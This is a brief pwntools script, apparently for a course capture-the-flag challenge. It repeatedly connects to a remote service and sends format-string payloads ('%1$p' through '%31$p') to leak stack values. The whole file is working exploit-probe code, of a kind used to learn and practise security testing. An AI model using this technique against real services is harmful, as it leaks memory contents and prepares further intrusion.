from pwn import *
import struct

# exploit string
for i in range(1,32):
	with context.silent:
		p = remote('cs4401shell.walls.ninja', 50203)
		p.recvline(timeout=1)
		arg = bytes('%' + str(i) + '$p', 'utf-8')
		p.sendline(arg)
		print(f'Arg{i}: {p.recvline(timeout=3)}')
